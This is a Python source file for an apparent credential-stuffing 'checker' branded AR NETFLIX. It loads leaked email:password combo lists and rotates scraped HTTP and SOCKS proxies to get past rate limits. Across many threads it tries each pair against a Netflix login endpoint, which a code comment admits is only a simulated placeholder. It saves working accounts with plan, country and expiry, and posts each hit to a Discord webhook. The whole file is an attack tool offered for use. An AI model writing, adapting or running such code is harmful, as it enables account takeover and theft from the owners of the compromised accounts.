import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO

logo = Fore.RED+'''
    █████╗ ██████╗     ███╗   ██╗███████╗████████╗██████╗ ██╗██╗  ██╗
   ██╔══██╗██╔══██╗    ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝
   ███████║██████╔╝    ██╔██╗ ██║█████╗     ██║   ██████╔╝██║ ╚███╔╝ 
   ██╔══██║██╔══██╗    ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██║ ██╔██╗ 
   ██║  ██║██║  ██║    ██║ ╚████║███████╗   ██║   ██║  ██║██║██╔╝ ██╗
   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n'''

Combos = []
proxylist = []
fname = ""
hits,bad,cpm,errors,retries,checked = 0,0,0,0,0,0
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, plan, country, expiry):
        self.email = email
        self.password = password
        self.plan = plan
        self.country = country
        self.expiry = expiry

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nPlan: {self.plan}\nCountry: {self.country}\nExpiry: {self.expiry}"
        return message+"\n============================\n"

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<plan>", self.plan or "N/A")
                    .replace("<country>", self.country or "N/A")
                    .replace("<expiry>", self.expiry or "N/A"),
                "username": "AR NETFLIX"
            }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetypes=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetypes=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"AR NETFLIX | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    global cpm
    os.system('clear')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"AR NETFLIX | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'" or proxytype  == "'4'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def check_netflix(email, password):
    global hits, bad, checked, cpm, retries, errors
    session = requests.Session()
    session.verify = False
    session.proxies = getproxy()
    
    try:
        # Netflix API endpoint (this is a simulated example - you'll need a real API)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'email': email,
            'password': password
        }
        
        response = session.post('https://api.netflix.com/login', json=payload, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            plan = data.get('plan', 'Unknown')
            country = data.get('country', 'Unknown')
            expiry = data.get('expiry_date', 'Unknown')
            
            hits += 1
            checked += 1
            cpm += 1
            
            CAPTURE = Capture(email, password, plan, country, expiry)
            with open(f"results/{fname}/Hits.txt", 'a') as file: 
                file.write(f"{email}:{password} | Plan: {plan} | Country: {country} | Expiry: {expiry}\n")
            open(f"results/{fname}/Capture.txt", 'a').write(CAPTURE.builder())
            CAPTURE.notify()
            
            if screen == "'2'": 
                print(Fore.GREEN+f"Hit: {email}:{password} | Plan: {plan}")
        else:
            bad += 1
            checked += 1
            cpm += 1
            if screen == "'2'": 
                print(Fore.RED+f"Bad: {email}:{password}")
    except Exception as e:
        errors += 1
        retries += 1
        if screen == "'2'": 
            print(Fore.YELLOW+f"Error: {email}:{password} - {str(e)}")
    finally:
        session.close()

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            check_netflix(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global config
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'WebhookMessage': '''@everyone NETFLIX HIT: ||`<email>:<password>`||
Plan: <plan>
Country: <country>
Expiry: <expiry>'''
        }
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4: 
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5: 
        socks5.extend(requests.get(service).text.splitlines())
    proxylist.clear()
    for proxy in http: proxylist.append(proxy)
    for proxy in socks4: proxylist.append(proxy)
    for proxy in socks5: proxylist.append(proxy)
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    time.sleep(5 * 60)  # Rescrape every 5 minutes
    get_proxies()

def Main():
    global proxytype, screen
    utils.set_title("AR NETFLIX")
    os.system('clear')
    try:
        loadconfig()
    except:
        print(Fore.RED+"There was an error loading the config. Please delete config.ini and restart.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(Recommended: 50-100 threads with proxies, 5 threads proxyless)")
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if proxytype =="'5'":
        print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()

if __name__ == "__main__":
    Main()